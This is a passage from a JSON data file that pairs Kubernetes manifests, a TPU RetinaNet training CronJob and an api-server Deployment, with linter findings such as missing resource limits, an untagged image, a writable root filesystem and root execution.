$(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "01165",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "01166",
    "manifest_path": "data/manifests/the_stack_sample/sample_0311.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          value: /vizier-image-secret\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable PL_VIZIER_IMAGE_SECRET_FILE in container \"api-server\" found"
  },
  {
    "id": "01167",
    "manifest_path": "data/manifests/the_stack_sample/sample_0311.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          value: /vizier-image-secret\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable PL_VIZIER_IMAGE_SECRET_PATH in container \"api-server\" found"
  },
  {
    "id": "01168",
    "manifest_path": "data/manifests/the_stack_sample/sample_0311.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          value: /vizier-image-secret\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"api-server\" is using an invalid container image, \"gcr.io/pl-dev-infra/cloud/api_server_image\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01169",
    "manifest_path": "data/manifests/the_stack_sample/sample_0311.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          value: /vizier-image-secret\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"api-server\" does not have a read-only root file system"
  },
  {
    "id": "01170",
    "manifest_path": "data/manifests/the_stack_sample/sample_0311.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          value: /vizier-image-secret\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"api-server\" is not set to runAsNonRoot"
  },
  {
    "id": "01171",
    "manifest_path": "data/manifests/the_stack_sample/sample_0311.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          value: /vizier-image-secret\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"api-server\" has cpu request 0"
  },
  {
    "id": "01172",
    "manifest_path": "data/manifests/the_stack_sample/sample_0311.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  selector:\n    matchLabels:\n      name: api-server\n  template:\n    metadata:\n      labels:\n        name: api-server\n    spec:\n      containers:\n      - name: api-server\n        image: gcr.io/pl-dev-infra/cloud/api_server_image\n        ports:\n        - containerPort: 51200\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 51200\n        envFrom:\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-session-secrets\n              key: session-key\n        - name: PL_VZMGR_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_VZMGR_SERVICE\n        - name: PL_AUTH_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_AUTH_SERVICE\n        - name: PL_PROJECT_MANAGER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROJECT_MANAGER_SERVICE\n        - name: PL_PROFILE_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_PROFILE_SERVICE\n        - name: PL_ARTIFACT_TRACKER_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ARTIFACT_TRACKER_SERVICE\n        - name: PL_ELASTIC_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: pl-service-config\n              key: PL_ELASTIC_SERVICE\n        - name: PL_SEGMENT_WRITE_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: segment-config\n              key: write-key\n        - name: PL_VIZIER_IMAGE_SECRET_PATH\n          value: /vizier-image-secret\n        - name: PL_VIZIER_IMAGE_SECRET_FILE\n          value: vizier_image_secret.json\n        - name: PL_ELASTIC_USERNAME\n          value: elastic\n        - name: PL_ELASTIC_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-elastic-es-elastic-user\n              key: elastic\n        - name: PL_ELASTIC_CA_CERT\n          value: /elastic-certs-pub/tls.crt\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_KRATOS_BROWSER_URL\n          value: https://$(PL_WORK_DOMAIN)/oauth/kratos\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: vizier-image-secret\n          mountPath: /vizier-image-secret\n        - name: elastic-certs-pub\n          mountPath: /elastic-certs-pub\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: vizier-image-secret\n        secret:\n          secretName: vizier-image-secret\n          optional: true\n      - name: 